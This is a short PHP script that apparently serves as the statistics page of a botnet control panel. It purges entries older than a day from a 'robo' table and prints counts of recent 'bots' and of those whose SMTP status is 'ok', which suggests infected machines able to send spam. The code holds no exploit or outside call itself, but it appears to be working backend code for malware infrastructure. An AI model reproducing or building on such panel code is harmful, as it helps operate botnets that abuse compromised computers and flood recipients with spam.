<?
    
    include("cfg.php");
    
    
    $time=date("U")-(3600*24);
        
    $sql = "delete from robo WHERE `time` < $time;";        
    $result = @mysql_query($sql);    
    
    
    echo "Bots last day<BR><BR>";
    
    
    $sql = "select * from robo WHERE `time` > $time;";        
    $result = @mysql_query($sql);    
    $num = @mysql_num_rows($result);    
    echo "ALL Count: ".$num . "<BR><BR>";
    
    
    $sql = "select * from robo WHERE `smtp` = 'ok';";        
    $result = @mysql_query($sql);    
    $num = @mysql_num_rows($result);    
    echo "ALL GOOD Count: ".$num . "<BR><BR>";
        
?>

